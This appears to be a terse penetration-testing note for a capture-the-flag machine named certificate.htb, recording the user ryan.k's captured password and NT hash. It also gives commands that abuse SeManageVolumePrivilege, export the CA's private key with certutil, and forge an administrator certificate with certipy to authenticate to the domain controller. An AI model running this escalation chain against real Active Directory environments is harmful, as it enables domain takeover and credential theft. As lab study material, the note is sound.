---
title: ryan.k
type: user
---

### ryan.k

#### validated credentials

```yaml credentials
- login: certificate.htb
  user: ryan.k
  password: pass
  nt_hash: fb54d1c05e301e024800c6ad99fe9b45 
```

```sh
.\SeManageVolumeExploit.exe;certutil -store My;certutil -p 'password' -exportPFX My 75b2f4bbf31f108945147b466131bdca 'C:\Windows\Tasks\ca.pfx'
```

download C:\Windows\Tasks\ca.pfx

```sh
certipy forge -ca-pfx ./ca.pfx -ca-password password -upn administrator@$DOMAIN 
certipy auth -pfx ./administrator_forged.pfx -domain $DOMAIN -dc-ip $RHOST
```

[[administrator]]

#### information

1. 
2. 
3. 

#### Privileges / roles / groups 






